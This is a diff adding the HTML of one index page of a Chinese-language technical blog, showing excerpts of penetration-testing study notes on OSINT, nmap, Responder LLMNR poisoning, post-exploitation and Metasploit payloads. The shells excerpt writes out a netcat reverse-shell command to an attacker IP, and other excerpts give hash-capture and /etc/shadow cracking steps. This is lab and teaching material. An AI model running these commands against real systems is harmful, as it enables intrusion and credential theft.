@@ -1,0 +1,237 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>xhj的博客 - 记录技术、学习与成长</title><meta name="author" content="xhj"><meta name="copyright" content="xhj"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="相关学习笔记">
+<meta property="og:type" content="website">
+<meta property="og:title" content="xhj的博客">
+<meta property="og:url" content="https://hzhzxfs.github.io/page/22/index.html">
+<meta property="og:site_name" content="xhj的博客">
+<meta property="og:description" content="相关学习笔记">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hzhzxfs.github.io/images/avatar.png">
+<meta property="article:author" content="xhj">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hzhzxfs.github.io/images/avatar.png"><script type="application/ld+json"></script><link rel="shortcut icon" href="/imges/favicon.ico"><link rel="canonical" href="https://hzhzxfs.github.io/page/22/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'xhj的博客',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'home'
+}</script><meta name="generator" content="Hexo 8.1.2"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">491</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">109</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">29</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">xhj的博客</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="site-info"><h1 id="site-title">xhj的博客</h1></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts nc" id="recent-posts"><div class="recent-post-items"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2025/05/21/social-media/" title="social-media">social-media</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-05-21T11:07:11.000Z" title="发表于 2025-05-21 19:07:11">2025-05-21</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/Network-Security/">Network Security</a></span></div><div class="content">使用社交媒体进行 OSINT通过浏览社交媒体平台可以收集大量开源&#x2F;公共信息。例如，访问目标组织的 LinkedIn 可能会出现：  现任员工及其凭据（电子邮件、姓名&#x2F;姓氏） 包含徽章照片、所用技术等的图像。  人员是组织安全中最薄弱的环节。即使只有员工姓名，您也可以枚举电子邮件地址。这些地址可用于搜索泄露的凭据，然后可用于利用目标。 </div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2025/05/20/shells/" title="shells">shells</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-05-20T02:02:20.000Z" title="发表于 2025-05-20 10:02:20">2025-05-20</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/Network-Security/">Network Security</a></span></div><div class="content">反向 Shell 与绑定 ShellShell 只是获取和维护对目标计算机的访问权限的一种方式。最常见的 shell 类型是反向 shell，其中受害计算机连接回我们。用于完成 rev-shell 的常用工具是 Netcat。 Rev 贝壳为了使 rev shell 工作，攻击设备需要侦听特定端口上的连接。在 Netcat 中，我们可以使用以下命令告诉设备监听选定的端口：nc -lvp 4444。  -l 用于监听 -v 表示详细 -p 用于端口通过此命令，我们告诉 Netcat 监听我们机器的端口 4444。  在目标上：为了让目标连接到我们的监听器，我们必须在目标上发送执行命令来建立连接。例如：如果目标安装了netcat（或者我们有一些如何将netcat安装到目标机器上），我们可以使用它来连接回我们的机器。 在这种情况下，目标上的命令将如下所示： 1nc &lt;attacking IP&gt; 4444 -e /bin/sh 在此命令中，目标设备上的 nc 创建一个返回攻击 IP 的 TCP 连接，并使用 -e 标志执行 shell (/bin/bash)（该 shell ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2025/05/19/scanning-with-nmap/" title="scanning-with-nmap">scanning-with-nmap</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-05-19T01:36:59.000Z" title="发表于 2025-05-19 09:36:59">2025-05-19</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/Network-Security/">Network Security</a></span></div><div class="content">nmap 扫描：nmap 是一个网络扫描工具，它扫描目标 IP 地址以查找开放端口。 -sS（“隐形”扫描）：这种技术不像以前那样隐秘，但在 nmap 中仍然被称为“隐秘扫描”。  此扫描将 SYN 数据包发送到目标地址上的所有端口（如果未给出端口范围，则为前 1000 个端口）。如果端口以 ACK 响应（就像 TCP 3 次握手一样），则 nmap 会关闭连接而不完成握手，从而使其“隐秘”。 nmap 将响应 ACK 的端口报告为“打开”。 其他选项：-T 计时-T 标志允许您告诉 nmap 您希望扫描完成的速度。您可以给它一个 0 到 5 之间的数字，其中 5 是最快的。 更高&#x2F;更快的设置将不太准确。较慢的设置将更准确并且更难检测（在此检查中不确定Nmap：时序和性能）。 -p 端口您可以使用 -p 标志告诉 nmap 您希望它扫描哪些端口。如果您不提供此标志，则 nmap 将扫描通常分配给特定服务的前 1000 个。 要扫描所有端口，请使用 nmap -p-。 -A 全部-A 标志告诉 nmap 使用所有检测选项进行扫描，其中包括版本控制 -sV、操作系统检测 -...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2025/05/18/rules-of-engagement/" title="rules-of-engagement">rules-of-engagement</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-05-18T00:32:26.000Z" title="发表于 2025-05-18 08:32:26">2025-05-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/Network-Security/">Network Security</a></span></div><div class="content">渗透测试参与规则ROE 是一份文件，概述了您在整个合作过程中可以做什么和不能做什么，并由您和客户签署并同意。它还定义了双方成员的“角色和责任”。 部分：以下部分列表可能出现在交战规则文件中，也可能不出现。每家公司都有不同的股本回报率计算方式，尽管有些部分绝对应该包括在内，例如范围、披露和接受。 根据客户的评估要求，每次参与的 ROE 也会有所不同。 目标概述交战规则文件意图的一般简介。这里可能出现的一句话可能是：  本文件的目的是概述和明确定义各方的角色和责任，以及商定的评估细节。  适用性描述该文档具体适用的内容，即该文档可能适用于渗透测试方向客户提供的“评估中涉及的所有要素”。这还包括客户组织的相关联系人 角色和职责本节概述了参与评估的所有各方的角色和责任。这里概述的一些常见角色示例如下： 渗透测试团队本节应包括参与渗透测试团队的所有成员包括来自客户的将参与的团队成员。 客户本节将概述客户的责任。责任的一些例子可能包括：  观察并记录进攻团队成员（您）的入侵尝试 防止执法部门介入 确保参与保密&#x2F;不向员工宣布  本节还可以为客户团队成员定义特定角色，例如： 客户联络点...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2025/05/17/responder/" title="responder">responder</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-05-17T14:16:40.000Z" title="发表于 2025-05-17 22:16:40">2025-05-17</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/Network-Security/">Network Security</a></span></div><div class="content">使用 Responder 捕获哈希值Responder 是一个可用于对 活动目录 域执行 LLMNR 中毒 攻击的工具。 LLMNR 并不是响应者可以对其进行中毒攻击的唯一协议。它还可以用于 NBT-NS 和 MDNS。 用法示例针对我们的 AD 实验室，我们将使用 Responder 来执行 LLMNR 中毒。这将使我们能够捕获从受害计算机发送的用于身份验证的哈希值。一旦我们有了哈希值，我们就可以破解它以获取该机器的密码。 随着我们的 AD 实验室启动并处于活动状态，我们将使用以下命令与响应者来攻击 域控制器 1responder -I eth0 -dwP 使用的标志： -I/ --interface：告诉响应者我们要使用哪个网络接口。 -d/ --DHCP：告诉响应者“也响应”DHCP 广播请求。 -w/ --wpad：启动恶意 WPAD 服务器（它将响应主机名解析请求） -P/ --ProxyAuth：告诉响应程序强制 NTLM 身份验证（即使目标网络没有打开 WPAD） 其他：-v/ --verbose：将您已经捕获的哈希添加到输出中。打开这些标志，并且您的攻击框与域和域...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2025/05/16/researching-vulns/" title="researching-vulns">researching-vulns</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-05-16T13:03:01.000Z" title="发表于 2025-05-16 21:03:01">2025-05-16</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/Network-Security/">Network Security</a></span></div><div class="content">研究潜在的漏洞根据我们在 Kioptrix 的扫描和枚举中发现的内容，我们需要研究我们可能已识别的漏洞。 研究结果按我们认为最容易被利用和&#x2F;或最容易受到攻击的顺序排列： 123456789101112131415161718192021222324252627Target: 10.0.3.5Ports w/ findings:	80: HTTP		:80/			Default page for Apache Web Server:				Apache v1.3.20 (Unix) (Red-Hat/Linux)				mod_ssl v2.8.4		:80/manual/*			manual pages for Apache HTTP Server Version 1.3b5		:80/manual/mod/mod_ssl/*			manual pages for mod_ssl v2.8.31	443: HTTPS			Apache/1.3.20 (Unix)  (Red-Hat/Linux) 				mod_ssl v2.8.4 				OpenSSL v0.9.6...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2025/05/15/post-exploitation/" title="post-exploitation">post-exploitation</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-05-15T05:05:47.000Z" title="发表于 2025-05-15 13:05:47">2025-05-15</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/Network-Security/">Network Security</a></span></div><div class="content">后利用一旦我们利用了一个目标，我们就想知道我们可以访问哪些信息，因为这些“是发现”，客户会想知道他们的资产有多脆弱。因此，后期利用包括对目标的大量侦察。 枚举目标网络拓扑我们想使用常用命令查看一些网络拓扑：  ifconfig - IP 地址 ip a - IP 地址 arp - MAC 地址 route - 路由表  ###须藤作为当前用户，我们可以使用 sudo -l 来查看我们的 sudo 权限是什么。这将向我们展示允许用户以 root 身份运行哪些命令。 /etc/passwd用于列出用户的密码，但现在仅列出带有 x 占位符的用户。 /etc/shadow密码哈希现在保存在 /etc/shadow 中，因此我们可以找到系统上用户密码的哈希值，然后使用 john 等工具破解这些哈希值以获取明文密码。 其他（稍后再说） 文件系统中的文件 连接到计算机的设备 网络上的其他设备 服务运行 开放端口 等   [！我以前的笔记（在文本中链接）]  IP 地址 MAC 地址 路由表 约翰   </div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2025/05/14/ports-and-protocols/" title="ports-and-protocols">ports-and-protocols</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-05-14T12:16:52.000Z" title="发表于 2025-05-14 20:16:52">2025-05-14</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/Network-Security/">Network Security</a></span></div><div class="content">常用端口 和协议有 65,535 个端口可用于连接网络上的设备。端口由设备操作系统管理的软件控制。 每个端口都与特定的服务或进程相关联。为了传输数据黑白端口通信端口必须以相同的方式配置。 前约 1000 个端口保留用于特定服务（例如：HTTPS 始终位于端口 443）。其余的可以使用&#x2F;分配给计算机&#x2F;程序决定的任何服务。 常用 TCP 端口FTP（文件传输协议）FTP 是分配给端口 21 的 TCP 协议。通过端口 21 访问设备，您可以上传、下载、复制、剪切、粘贴（等）由该设备提供服务的文件。 SSH（安全外壳协议）和 TelnetSSH（端口 22）和 Telnet（端口 23）都是允许远程方连接到设备并在其上执行命令的协议。 Telnet 是两者中较旧的，并且不安全，因为双方之间的所有通信都是以明文形式传递。 SSH 的诞生是为了取代 telnet。通过两台设备之间的 SSH 通信，“已加密”，并且双方在发送&#x2F;接收数据之前必须“进行身份验证”。 POP3、IMAP、SMTP这三个协议都与email相关。 SMTP（端口 25）负责通过客户端和邮件...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2025/05/13/payloads/" title="payloads">payloads</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-05-13T11:53:53.000Z" title="发表于 2025-05-13 19:53:53">2025-05-13</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/Network-Security/">Network Security</a></span></div><div class="content">分阶段与非分阶段有效负载有效负载是指建立对目标机器的访问（通常通过 shell）的实际代码或可执行文件。主要有两种类型：阶段式和非阶段式。 非分阶段非分段有效负载一次性发送整个 shellcode 或执行代码。这种类型的有效负载“通常大于”分段有效负载。  上演分阶段的有效负载是分阶段发送到目标的，而不是一次全部发送。由于代码是以块的形式发送的，因此非分阶段的有效负载往往“不太稳定”。然而，分阶段可能是有利的，因为每个阶段都“较小”，并且在发送到目标时不易被检测到。 奖金：使用 Metasploit 时，您可以通过有效负载的路径来识别非阶段性有效负载与阶段性负载： 1234# Non-staged payload:windows/meterpreter_reverse_tcp# Staged payload:windows/meterpreter/reverse_tcp  [！我以前的笔记（在文本中链接）]  Metasploit   </div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2025/05/12/pattern-create/" title="pattern-create">pattern-create</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-05-12T04:54:42.000Z" title="发表于 2025-05-12 12:54:42">2025-05-12</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/Network-Security/">Network Security</a></span></div><div class="content">通过创建图案查找偏移量现在我们知道了与 fuzzing 程序的偏移量，我们可以使用 pattern create 来帮助微调我们的漏洞利用脚本和有效负载。 **！参见模式创建（相对）模式创建 (GitHub 存储库) 查找 确切 地址现在我们已经使用 pattern_create 创建了一个缓冲区字符串，我们可以将模糊测试脚本复制粘贴到新脚本中（当我们对其进行微调时，它将成为我们的漏洞利用程序）。 123456789101112131415161718192021222324252627import sys, socket# Create the buffer of &#x27;A&#x27; charactersbuffer = &quot;A&quot; * 100try:	# Build the payload by appending the TRUN command to the buffer	payload = &quot;TRUN /.:/&quot; + buffer	# Create, open, and connect to the socket (conne...</div></div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/21/#content-inner"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/21/#content-inner">21</a><span class="page-number current">22</span><a class="page-number" href="/page/23/#content-inner">23</a><span class="space">&hellip;</span><a class="page-number" href="/page/50/#content-inner">50</a><a class="extend next" rel="next" href="/page/23/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xhj</div><div class="author-info-description">相关学习笔记</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">491</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">109</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">29</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/hzhzxfs"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/03/Multi-Agent/" title="Multi-Agent">Multi-Agent</a><time datetime="2026-06-03T02:57:05.000Z" title="发表于 2026-06-03 10:57:05">2026-06-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/02/Multi-Agent%20vs%20Single-Agent/" title="Multi-Agent vs Single-Agent">Multi-Agent vs Single-Agent</a><time datetime="2026-06-02T14:20:10.000Z" title="发表于 2026-06-02 22:20:10">2026-06-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/01/Harness%20Engineering/" title="Harness Engineering">Harness Engineering</a><time datetime="2026-06-01T10:54:37.000Z" title="发表于 2026-06-01 18:54:37">2026-06-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/25/25-%E6%9E%B6%E6%9E%84%E6%A8%A1%E5%BC%8F%E6%80%BB%E7%BB%93/" title="25-架构模式总结">25-架构模式总结</a><time datetime="2026-05-25T00:50:50.000Z" title="发表于 2026-05-25 08:50:50">2026-05-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/24/24-Skill-Plugin%E5%BC%80%E5%8F%91%E5%AE%9E%E6%88%98/" title="24-Skill-Plugin开发实战">24-Skill-Plugin开发实战</a><time datetime="2026-05-24T08:02:19.000Z" title="发表于 2026-05-24 16:02:19">2026-05-24</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            <a class="card-more-btn" href="/categories/" title="查看更多">
+      <i class="fas fa-angle-right"></i></a>
+          </div>
+          <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/AI-Agent/"><span class="card-category-list-name">AI Agent</span><span class="card-category-list-count">40</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Algorithm/"><span class="card-category-list-name">Algorithm</span><span class="card-category-list-count">20</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Backend-Dev/"><span class="card-category-list-name">Backend Dev</span><span class="card-category-list-count">74</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Big-Data/"><span class="card-category-list-name">Big Data</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/C-C/"><span class="card-category-list-name">C/C++</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Claude-Code/"><span class="card-category-list-name">Claude Code</span><span class="card-category-list-count">71</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Computer-Basics/"><span class="card-category-list-name">Computer Basics</span><span class="card-category-list-count">18</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Computer-Network/"><span class="card-category-list-name">Computer Network</span><span class="card-category-list-count">2</span></a></li>
+          </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/Netty/" style="font-size: 1.1em; color: #999">Netty</a> <a href="/tags/PyG/" style="font-size: 1.15em; color: #999b9e">PyG</a> <a href="/tags/Stacking/" style="font-size: 1.1em; color: #999">Stacking</a> <a href="/tags/Pandas/" style="font-size: 1.25em; color: #999fa7">Pandas</a> <a href="/tags/Neural-Networks/" style="font-size: 1.1em; color: #999">Neural Networks</a> <a href="/tags/PCA/" style="font-size: 1.1em; color: #999">PCA</a> <a href="/tags/Maven/" style="font-size: 1.1em; color: #999">Maven</a> <a href="/tags/Tornado/" style="font-size: 1.35em; color: #99a3b1">Tornado</a> <a href="/tags/PCV/" style="font-size: 1.1em; color: #999">PCV</a> <a href="/tags/RabbitMQ/" style="font-size: 1.1em; color: #999">RabbitMQ</a> <a href="/tags/Claude-Code/" style="font-size: 1.5em; color: #99a9bf">Claude Code</a> <a href="/tags/Heap-Memory/" style="font-size: 1.1em; color: #999">Heap Memory</a> <a href="/tags/Tree/" style="font-size: 1.3em; color: #99a1ac">Tree</a> <a href="/tags/dijkstra/" style="font-size: 1.1em; color: #999">dijkstra</a> <a href="/tags/Redis/" style="font-size: 1.15em; color: #999b9e">Redis</a> <a href="/tags/GAT/" style="font-size: 1.15em; color: #999b9e">GAT</a> <a href="/tags/MySQL/" style="font-size: 1.25em; color: #999fa7">MySQL</a> <a href="/tags/Computer-Basics/" style="font-size: 1.4em; color: #99a5b6">Computer Basics</a> <a href="/tags/JVM-Architecture/" style="font-size: 1.1em; color: #999">JVM Architecture</a> <a href="/tags/Linear-Regression/" style="font-size: 1.1em; color: #999">Linear Regression</a> <a href="/tags/List/" style="font-size: 1.1em; color: #999">List</a> <a href="/tags/Kruskal/" style="font-size: 1.1em; color: #999">Kruskal</a> <a href="/tags/Algorithm/" style="font-size: 1.15em; color: #999b9e">Algorithm</a> <a href="/tags/Object-Identification/" style="font-size: 1.1em; color: #999">Object Identification</a> <a href="/tags/Message-Queue/" style="font-size: 1.1em; color: #999">Message Queue</a> <a href="/tags/Gradient-descent/" style="font-size: 1.1em; color: #999">Gradient descent</a> <a href="/tags/HBOS/" style="font-size: 1.1em; color: #999">HBOS</a> <a href="/tags/LOF/" style="font-size: 1.15em; color: #999b9e">LOF</a> <a href="/tags/Grid-search/" style="font-size: 1.1em; color: #999">Grid search</a> <a href="/tags/OSI/" style="font-size: 1.1em; color: #999">OSI</a> <a href="/tags/Embedding/" style="font-size: 1.15em; color: #999b9e">Embedding</a> <a href="/tags/OLSE/" style="font-size: 1.15em; color: #999b9e">OLSE</a> <a href="/tags/Prim/" style="font-size: 1.1em; color: #999">Prim</a> <a href="/tags/NMF/" style="font-size: 1.1em; color: #999">NMF</a> <a href="/tags/DataFrame/" style="font-size: 1.1em; color: #999">DataFrame</a> <a href="/tags/AI-Agent/" style="font-size: 1.45em; color: #99a7ba">AI Agent</a> <a href="/tags/Kafka/" style="font-size: 1.1em; color: #999">Kafka</a> <a href="/tags/GNN/" style="font-size: 1.2em; color: #999da3">GNN</a> <a href="/tags/Thread/" style="font-size: 1.15em; color: #999b9e">Thread</a> <a href="/tags/Compilation/" style="font-size: 1.1em; color: #999">Compilation</a></div></div><div class="card-widget card-archives">
+    <div class="item-headline">
+      <i class="fas fa-archive"></i>
+      <span>归档</span>
+      <a class="card-more-btn" href="/archives/"
+            title="查看更多">
+            <i class="fas fa-angle-right"></i>
+          </a>
+    </div>
+  
+    <ul class="card-archive-list">
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/06/">
+            <span class="card-archive-list-date">
+              六月 2026
+            </span>
+            <span class="card-archive-list-count">3</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/05/">
+            <span class="card-archive-list-date">
+              五月 2026
+            </span>
+            <span class="card-archive-list-count">25</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/04/">
+            <span class="card-archive-list-date">
+              四月 2026
+            </span>
+            <span class="card-archive-list-count">16</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/03/">
+            <span class="card-archive-list-date">
+              三月 2026
+            </span>
+            <span class="card-archive-list-count">20</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/02/">
+            <span class="card-archive-list-date">
+              二月 2026
+            </span>
+            <span class="card-archive-list-count">10</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/01/">
+            <span class="card-archive-list-date">
+              一月 2026
+            </span>
+            <span class="card-archive-list-count">22</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/12/">
+            <span class="card-archive-list-date">
+              十二月 2025
+            </span>
+            <span class="card-archive-list-count">15</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
